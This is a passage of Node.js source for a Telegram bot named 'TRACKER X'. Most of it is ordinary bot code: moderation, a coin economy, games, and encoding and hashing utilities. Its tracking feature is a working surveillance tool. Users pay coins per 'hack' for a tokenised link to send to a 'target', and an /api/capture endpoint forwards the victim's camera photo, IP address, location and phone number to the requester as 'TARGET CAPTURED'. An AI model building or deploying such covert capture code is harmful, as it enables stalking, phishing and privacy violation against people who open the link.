          await ctx.reply(`❌ Syntax Error:\n<code>${valResult.error}</code>`, { parse_mode: "HTML" });
        }
        userStates.delete(userId);
        break;
        
      case "encrypt":
        const encResult = encryptText(text);
        if (encResult.success) {
          botStats.totalEncryptions++;
          await ctx.reply(`🔐 **Encrypted Text:**\n\n<code>${encResult.encrypted}</code>\n\nKeep this safe!`, { parse_mode: "HTML" });
        } else {
          await ctx.reply(`❌ Encryption failed: ${encResult.error}`);
        }
        userStates.delete(userId);
        break;
        
      case "decrypt":
        const decResult = decryptText(text);
        if (decResult.success) {
          botStats.totalDecryptions++;
          await ctx.reply(`🔓 **Decrypted Text:**\n\n${decResult.decrypted}`);
        } else {
          await ctx.reply(`❌ Decryption failed: ${decResult.error}`);
        }
        userStates.delete(userId);
        break;
        
      case "base64":
        await ctx.reply(`📝 **Base64 Encoded:**\n\n<code>${Buffer.from(text).toString('base64')}</code>`, { parse_mode: "HTML" });
        userStates.delete(userId);
        break;
        
      case "hash":
        const hashResult = generateHash(text, 'sha256');
        if (hashResult.success) {
          botStats.totalHashes++;
          await ctx.reply(`🔢 **SHA256 Hash:**\n\n<code>${hashResult.hash}</code>`, { parse_mode: "HTML" });
        } else {
          await ctx.reply(`❌ ${hashResult.error}`);
        }
        userStates.delete(userId);
        break;
        
      case "random":
        const [min, max] = text.split(" ").map(Number);
        if (isNaN(min) || isNaN(max)) {
          await ctx.reply("❌ Invalid format! Use: min max\nExample: 1 100");
        } else {
          const random = Math.floor(Math.random() * (max - min + 1)) + min;
          await ctx.reply(`🎲 Random number between ${min}-${max}: <code>${random}</code>`, { parse_mode: "HTML" });
        }
        userStates.delete(userId);
        break;
        
      case "reminder":
        const parts = text.split(" ");
        const timeStr = parts[0];
        const reminderMsg = parts.slice(1).join(" ");
        let seconds = 0;
        
        if (timeStr.endsWith("m")) seconds = parseInt(timeStr) * 60;
        else if (timeStr.endsWith("h")) seconds = parseInt(timeStr) * 3600;
        else if (timeStr.endsWith("d")) seconds = parseInt(timeStr) * 86400;
        else {
          await ctx.reply("❌ Invalid time format! Use: 10m, 1h, 2d");
          userStates.delete(userId);
          break;
        }
        
        if (isNaN(seconds) || !reminderMsg) {
          await ctx.reply("❌ Usage: 10m Your message here");
        } else {
          setTimeout(async () => {
            await ctx.reply(`⏰ REMINDER: ${reminderMsg}`);
          }, seconds * 1000);
          await ctx.reply(`✅ Reminder set for ${timeStr}: "${reminderMsg}"`);
        }
        userStates.delete(userId);
        break;
        
      case "afk":
        user.afk = { message: text, time: Date.now() };
        users.set(userId, user);
        await ctx.reply(`💤 You are now AFK: ${text}`);
        userStates.delete(userId);
        break;
        
      case "set_welcome":
        welcomeMessages.set(state.chatId, text);
        await ctx.reply(`✅ Welcome message set!\n\n${text}`);
        userStates.delete(userId);
        break;
        
      case "set_goodbye":
        goodbyeMessages.set(state.chatId, text);
        await ctx.reply(`✅ Goodbye message set!\n\n${text}`);
        userStates.delete(userId);
        break;
        
      case "set_rules":
        groupRules.set(state.chatId, text);
        await ctx.reply(`✅ Group rules set!\n\nUsers can view with /rules`);
        userStates.delete(userId);
        break;
        
      case "set_sticky":
        groupSticky.set(state.chatId, { message: text, messageId: null });
        await ctx.reply(`✅ Sticky message set!\n\n${text}`);
        userStates.delete(userId);
        break;
    }
    return;
  }
  
  // Anti-link protection
  if (antilinkGroups.get(ctx.chat.id)) {
    const text = ctx.message.text;
    const links = ["http://", "https://", "t.me/", "telegram.me", ".com", ".net", ".org"];
    const hasLink = links.some(link => text.includes(link));
    
    if (hasLink) {
      await ctx.deleteMessage();
      await ctx.reply(`🚫 Links are not allowed! ${ctx.from.first_name}, please don't share links.`);
      return;
    }
  }
  
  // Anti-spam protection
  if (antispamGroups.get(ctx.chat.id)) {
    const now = Date.now();
    const userSpam = antispamUsers.get(`${ctx.chat.id}_${userId}`) || [];
    const recent = userSpam.filter(t => now - t < 5000);
    
    if (recent.length >= 3) {
      await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
        until_date: Math.floor(now / 1000) + 60,
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false
      });
      await ctx.reply(`🛡️ ${ctx.from.first_name} has been muted for spamming!`);
      antispamUsers.delete(`${ctx.chat.id}_${userId}`);
    } else {
      recent.push(now);
      antispamUsers.set(`${ctx.chat.id}_${userId}`, recent);
    }
  }
  
  // Slow mode
  const slow = slowMode.get(ctx.chat.id);
  if (slow) {
    const lastMsg = userWorkCooldown.get(`${ctx.chat.id}_${userId}_slow`) || 0;
    const now = Date.now();
    if (now - lastMsg < slow * 1000) {
      await ctx.deleteMessage();
      await ctx.reply(`⏱️ Slow mode enabled! Please wait ${slow} seconds between messages.`);
      return;
    }
    userWorkCooldown.set(`${ctx.chat.id}_${userId}_slow`, now);
  }
  
  addXP(userId, 1);
});

// ========== NEW MEMBER HANDLER ==========
bot.on("new_chat_members", async (ctx) => {
  const welcomeMsg = welcomeMessages.get(ctx.chat.id);
  if (!welcomeMsg) return;
  
  for (const member of ctx.message.new_chat_members) {
    if (member.id === bot.botInfo.id) {
      botStats.totalGroups++;
      continue;
    }
    
    const text = welcomeMsg
      .replace(/{name}/g, member.first_name)
      .replace(/{group}/g, ctx.chat.title)
      .replace(/{mention}/g, `[${member.first_name}](tg://user?id=${member.id})`)
      .replace(/{count}/g, ctx.chat.members_count || "?");
    
    await ctx.reply(text, { parse_mode: "Markdown" });
  }
});

// ========== LEFT MEMBER HANDLER ==========
bot.on("left_chat_member", async (ctx) => {
  const goodbyeMsg = goodbyeMessages.get(ctx.chat.id);
  if (!goodbyeMsg) return;
  
  const member = ctx.message.left_chat_member;
  if (member.id === bot.botInfo.id) return;
  
  const text = goodbyeMsg
    .replace(/{name}/g, member.first_name)
    .replace(/{group}/g, ctx.chat.title);
  
  await ctx.reply(text);
});

// ========== REACTION HANDLER FOR GIVEAWAY ==========
bot.on("message_reaction", async (ctx) => {
  const reaction = ctx.message_reaction;
  if (!reaction) return;
  
  for (const giveaway of groupGiveaways.values()) {
    if (reaction.message_id === giveaway.messageId) {
      const user = reaction.user;
      if (!giveaway.entries.includes(user.id)) {
        giveaway.entries.push(user.id);
      }
    }
  }
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  👑 ADMIN PANEL - TRACKER X v3.0 PRO   ║
╚══════════════════════════════════════════╝

<b>💰 ECONOMY CONTROL</b>
/addcoins @user amount - Add coins
/removecoins @user amount - Remove coins
/setcoins @user amount - Set coins

<b>🎁 REDEEM CODES</b>
/gencode coins uses hours - Generate code
/codes - List all codes
/delcode CODE - Delete code

<b>📢 BROADCAST</b>
/broadcast message - Send to all users

<b>📊 STATISTICS</b>
/botstats - Full bot stats
/users - List all users
/userinfo @user - User details

<b>⚙️ SYSTEM</b>
/backup - Backup database
/restart - Restart bot
/maintenance on/off - Maintenance mode
  `), { parse_mode: "HTML" });
});

bot.command("addcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoins @username amount");
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  let targetId = null;
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) return ctx.reply(`User @${username} not found!`);
  
  addCoins(targetId, amount, "Admin added");
  await ctx.reply(`✅ Added ${amount} coins to @${username}!`);
});

bot.command("removecoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /removecoins @username amount");
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  let targetId = null;
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) return ctx.reply(`User @${username} not found!`);
  
  removeCoins(targetId, amount, "Admin removed");
  await ctx.reply(`✅ Removed ${amount} coins from @${username}!`);
});

bot.command("setcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /setcoins @username amount");
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  let targetId = null;
  let targetUser = null;
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        targetUser = user;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetUser) return ctx.reply(`User @${username} not found!`);
  
  targetUser.coins = amount;
  users.set(targetId, targetUser);
  await ctx.reply(`✅ Set @${username}'s balance to ${amount} coins!`);
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  const coins = parseInt(args[1]) || 50;
  const uses = parseInt(args[2]) || 10;
  const hours = parseInt(args[3]) || 24;
  
  const code = generateRedeemCode(coins, uses, hours);
  await ctx.reply(`✅ **Code Generated!**\n\nCode: \`${code}\`\nCoins: ${coins}\nUses: ${uses}\nExpires: ${hours}h`, { parse_mode: "Markdown" });
});

bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  if (redeemCodes.size === 0) return ctx.reply("No active codes.");
  
  let message = "📋 **ACTIVE CODES:**\n\n";
  for (const [code, data] of redeemCodes) {
    const expires = Math.floor((data.expiresAt - Date.now()) / 3600000);
    message += `\`${code}\` - ${data.coins} coins - ${data.remainingUses} uses - ${expires}h left\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("delcode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /delcode CODE");
  
  const code = args[1].toUpperCase();
  if (redeemCodes.has(code)) {
    redeemCodes.delete(code);
    await ctx.reply(`✅ Code \`${code}\` deleted!`, { parse_mode: "Markdown" });
  } else {
    await ctx.reply(`❌ Code \`${code}\` not found!`, { parse_mode: "Markdown" });
  }
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /broadcast message");
  
  await ctx.reply("📢 Broadcasting...");
  
  let success = 0, failed = 0;
  for (const [userId] of users) {
    try {
      await ctx.telegram.sendMessage(userId, `📢 **ANNOUNCEMENT**\n\n${message}`, { parse_mode: "Markdown" });
      success++;
    } catch(e) {
      failed++;
    }
  }
  
  await ctx.reply(`✅ Broadcast complete!\nSent: ${success}\nFailed: ${failed}`);
});

bot.command("botstats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const uptime = Date.now() - botStats.startTime;
  const totalCoins = Array.from(users.values()).reduce((sum, u) => sum + u.coins, 0);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  📊 FULL BOT STATISTICS                ║
╚══════════════════════════════════════════╝

<b>🤖 BOT INFO:</b>
• Version: ${BOT_VERSION}
• Uptime: ${Math.floor(uptime / 86400000)}d ${Math.floor((uptime % 86400000) / 3600000)}h
• Users: ${botStats.totalUsers}
• Groups: ${botStats.totalGroups}

<b>💰 ECONOMY:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Coins in Circulation: ${totalCoins}
• Referrals: ${botStats.totalReferrals}
• Redeems: ${botStats.totalRedeems}

<b>📈 ACTIVITY:</b>
• Commands: ${botStats.totalCommands}
• Messages: ${botStats.totalMessages}
• Hacks: ${botStats.totalHacksUsed}
• Obfuscations: ${botStats.totalObfuscations}
• Encryptions: ${botStats.totalEncryptions}
• Decryptions: ${botStats.totalDecryptions}
• Hashes: ${botStats.totalHashes}

<b>🔨 MODERATION:</b>
• Bans: ${botStats.totalBans}
• Kicks: ${botStats.totalKicks}
• Mutes: ${botStats.totalMutes}
• Warnings: ${botStats.totalWarns}
  `), { parse_mode: "HTML" });
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  let message = "📋 **USERS LIST:**\n\n";
  let count = 0;
  for (const [id, user] of users) {
    count++;
    message += `${count}. \`${id}\` - ${user.coins} coins - Lvl ${user.level}\n`;
    if (count >= 20) break;
  }
  message += `\nTotal: ${users.size} users`;
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("userinfo", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /userinfo @username");
  
  const username = args[1].replace("@", "");
  let targetId = null;
  let targetUser = null;
  
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        targetUser = user;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetUser) return ctx.reply(`User @${username} not found!`);
  
  const winRate = targetUser.gamesPlayed > 0 ? ((targetUser.gamesWon / targetUser.gamesPlayed) * 100).toFixed(1) : 0;
  
  await ctx.reply(formatMessage(`
👤 **USER INFO:** @${username}

<b>📝 Basic:</b>
• ID: \`${targetId}\`
• Joined: ${new Date(targetUser.joinDate).toLocaleDateString()}

<b>💰 Economy:</b>
• Coins: ${targetUser.coins}
• Total Earned: ${targetUser.totalEarned}
• Total Spent: ${targetUser.totalSpent}

<b>📊 Stats:</b>
• Level: ${targetUser.level}
• Referrals: ${targetUser.referrals}
• Hacks: ${targetUser.usedHacks}
• Games: ${targetUser.gamesWon}W / ${targetUser.gamesLost}L
• Win Rate: ${winRate}%

<b>🏆 Badges:</b>
${targetUser.badges.join(", ")}
  `), { parse_mode: "Markdown" });
});

bot.command("backup", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const backup = {
    timestamp: Date.now(),
    users: Array.from(users.entries()),
    redeemCodes: Array.from(redeemCodes.entries()),
    botStats: botStats,
    version: BOT_VERSION
  };
  
  const buffer = Buffer.from(JSON.stringify(backup, null, 2));
  await ctx.replyWithDocument({ source: buffer, filename: `tracker_x_backup_${Date.now()}.json` });
  await ctx.reply("✅ Backup created!");
});

bot.command("restart", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  await ctx.reply("🔄 Restarting...");
  setTimeout(() => process.exit(0), 2000);
});

bot.command("maintenance", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  const mode = args[1];
  
  if (mode === "on") {
    maintenanceMode = true;
    await ctx.reply("🛠️ Maintenance mode ENABLED!");
  } else if (mode === "off") {
    maintenanceMode = false;
    await ctx.reply("✅ Maintenance mode DISABLED!");
  } else {
    await ctx.reply(`Maintenance mode: ${maintenanceMode ? "ON" : "OFF"}`);
  }
});

// ========== OTHER COMMANDS ==========
bot.command("balance", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(`💰 Balance: ${user.coins} coins`);
});

bot.command("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && now - user.lastDaily < dayInMs) {
    const hours = Math.floor((dayInMs - (now - user.lastDaily)) / 3600000);
    return ctx.reply(`⏰ Come back in ${hours} hours!`);
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && now - user.lastDaily < dayInMs * 2) streak++;
  else streak = 1;
  
  const bonus = Math.min(streak, 10);
  const reward = DAILY_REWARD + bonus;
  addCoins(ctx.from.id, reward, "Daily");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(`🎁 Daily: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 Balance: ${user.coins + reward}`);
});

bot.command("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const minutes = Math.ceil((3600000 - (now - lastWork)) / 60000);
    return ctx.reply(`⏰ Rest ${minutes} minutes!`);
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🍕 Delivery"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  await ctx.reply(`💼 Worked as ${job}! +${reward} coins!`);
});

bot.command("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(`👤 ${ctx.from.first_name}\n💰 ${user.coins} coins\n📊 Level ${user.level}\n👥 ${user.referrals} referrals`);
});

bot.command("stats", async (ctx) => {
  await ctx.reply(`📊 Users: ${botStats.totalUsers}\n💰 Coins: ${botStats.totalCoinsGiven}\n🎯 Hacks: ${botStats.totalHacksUsed}`);
});

bot.command("redeem", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /redeem CODE");
  
  const result = redeemCode(ctx.from.id, args[1]);
  await ctx.reply(result.message);
});

bot.command("guess", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const guess = parseInt(args[1]);
  const number = Math.floor(Math.random() * 10) + 1;
  
  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess 1-10!");
  if (user.coins < GAME_BET) return ctx.reply(`Need ${GAME_BET} coin!`);
  
  removeCoins(ctx.from.id, GAME_BET, "Guess");
  
  if (guess === number) {
    const winnings = GAME_BET * 5;
    addCoins(ctx.from.id, winnings, "Won guess");
    user.gamesWon++;
    await ctx.reply(`🎉 Correct! Number was ${number}! +${winnings} coins!`);
  } else {
    await ctx.reply(`❌ Wrong! Number was ${number}. -${GAME_BET} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.command("rps", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const choice = args[1]?.toLowerCase();
  
  if (!["rock", "paper", "scissors"].includes(choice)) return ctx.reply("Choose rock, paper, or scissors!");
  if (user.coins < GAME_BET) return ctx.reply(`Need ${GAME_BET} coin!`);
  
  const botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
  let result;
  
  if (choice === botChoice) result = "tie";
  else if (
    (choice === "rock" && botChoice === "scissors") ||
    (choice === "paper" && botChoice === "rock") ||
    (choice === "scissors" && botChoice === "paper")
  ) result = "win";
  else result = "lose";
  
  removeCoins(ctx.from.id, GAME_BET, "RPS");
  
  if (result === "win") {
    const winnings = GAME_BET * 2;
    addCoins(ctx.from.id, winnings, "Won RPS");
    user.gamesWon++;
    await ctx.reply(`You chose ${choice}, I chose ${botChoice}!\n🎉 WIN! +${winnings} coins!`);
  } else if (result === "lose") {
    await ctx.reply(`You chose ${choice}, I chose ${botChoice}!\n💸 LOSE! -${GAME_BET} coin!`);
    user.gamesLost++;
  } else {
    await ctx.reply(`You chose ${choice}, I chose ${botChoice}!\n🤝 TIE! Coins returned.`);
    addCoins(ctx.from.id, GAME_BET, "RPS tie");
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.command("base64", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const action = args[1];
  const text = args.slice(2).join(" ");
  
  if (action === "encode") {
    const result = encodeBase64(text);
    if (result.success) await ctx.reply(`📝 Encoded:\n<code>${result.encoded}</code>`, { parse_mode: "HTML" });
  } else if (action === "decode") {
    const result = decodeBase64(text);
    if (result.success) await ctx.reply(`📝 Decoded:\n${result.decoded}`);
    else await ctx.reply("❌ Invalid base64!");
  } else {
    await ctx.reply("Usage: /base64 encode text\n/base64 decode base64string");
  }
});

bot.command("hash", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const algo = args[1];
  const text = args.slice(2).join(" ");
  
  if (!algo || !text) return ctx.reply("Usage: /hash md5 text");
  
  const result = generateHash(text, algo);
  if (result.success) await ctx.reply(`🔢 ${algo.toUpperCase()}:\n<code>${result.hash}</code>`, { parse_mode: "HTML" });
  else await ctx.reply(`❌ ${result.error}`);
});

bot.command("random", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const min = parseInt(args[1]) || 1;
  const max = parseInt(args[2]) || 100;
  const random = Math.floor(Math.random() * (max - min + 1)) + min;
  await ctx.reply(`🎲 Random: ${random}`);
});

bot.command("note", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const action = args[1];
  
  if (action === "save") {
    const note = args.slice(2).join(" ");
    if (!note) return ctx.reply("Usage: /note save your note");
    user.notes.push({ id: Date.now(), text: note });
    users.set(ctx.from.id, user);
    await ctx.reply("✅ Note saved!");
  } else if (action === "list") {
    if (!user.notes.length) return ctx.reply("No notes.");
    let msg = "📋 Your notes:\n\n";
    user.notes.forEach((n, i) => msg += `${i+1}. ${n.text}\n`);
    await ctx.reply(msg);
  } else if (action === "delete") {
    const index = parseInt(args[2]) - 1;
    if (isNaN(index)) return ctx.reply("Usage: /note delete number");
    user.notes.splice(index, 1);
    users.set(ctx.from.id, user);
    await ctx.reply("✅ Note deleted!");
  } else {
    await ctx.reply("Usage: /note save text | /note list | /note delete number");
  }
});

bot.command("whois", async (ctx) => {
  let target;
  const reply = ctx.message.reply_to_message;
  const args = ctx.message.text.split(" ");
  
  if (reply) {
    target = reply.from;
  } else if (args[1]) {
    const username = args[1].replace("@", "");
    try {
      const chat = await ctx.telegram.getChat(username);
      target = chat;
    } catch {
      return ctx.reply("User not found!");
    }
  } else {
    target = ctx.from;
  }
  
  await ctx.reply(`🔍 **WHOIS**\n\nName: ${target.first_name}\nID: \`${target.id}\`\nUsername: @${target.username || 'None'}`, { parse_mode: "Markdown" });
});

// ========== TRACKING FEATURE ==========
bot.action("tracking_menu", async (ctx) => {
  await safeEditMessage(ctx, "🎯 TRACKER X MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
    parse_mode: "HTML",
    ...trackingMenu()
  });
});

bot.action("pool", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(`❌ Need ${TRACKING_COST} coins!`);
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "pool",
    createdAt: Date.now()
  });
  
  await ctx.reply(formatMessage(`
✅ Tracking initialized!
💰 Coins: -${TRACKING_COST}
⏱️ Token expires in 10 minutes

<b>Share this link:</b>
<code>${DOMAIN}?token=${token}</code>
  `), { parse_mode: "HTML" });
});

bot.action("normal", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(`❌ Need ${TRACKING_COST} coins!`);
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "normal",
    createdAt: Date.now()
  });
  
  await ctx.reply(formatMessage(`
✅ Tracking initialized!
💰 Coins: -${TRACKING_COST}
⏱️ Token expires in 10 minutes

<b>Share this link:</b>
<code>${DOMAIN}?token=${token}</code>
  `), { parse_mode: "HTML" });
});

// ========== API ENDPOINT ==========
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location, number, country } = req.body;
    
    if (!token || !activeTokens.has(token)) {
      return res.status(400).json({ error: "Invalid token" });
    }
    
    const tokenData = activeTokens.get(token);
    
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(tokenData.chatId, { source: buffer }, {
        caption: formatMessage(`
📸 TARGET CAPTURED!

📱 Number: ${number || "Unknown"}
🌍 Country: ${country || "Unknown"}
🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
🕐 Time: ${new Date().toLocaleString()}
        `),
        parse_mode: "HTML"
      });
    } else {
      await bot.telegram.sendMessage(tokenData.chatId, formatMessage(`
📍 LOCATION TRACKED!

🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
📱 Number: ${number || "Unknown"}
🌍 Country: ${country || "Unknown"}
🕐 Time: ${new Date().toLocaleString()}
      `), { parse_mode: "HTML" });
    }
    
    const user = users.get(tokenData.userId);
    if (user) {
      user.successfulHacks = (user.successfulHacks || 0) + 1;
      users.set(tokenData.userId, user);
    }
    
    activeTokens.delete(token);
    res.json({ status: "success" });
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ========== SERVE FRONTEND ==========
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

bot.launch().then(() => {
  console.log(`🤖 Bot running!`);
  console.log(`🔱 TRACKER X v${BOT_VERSION} is LIVE!`);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
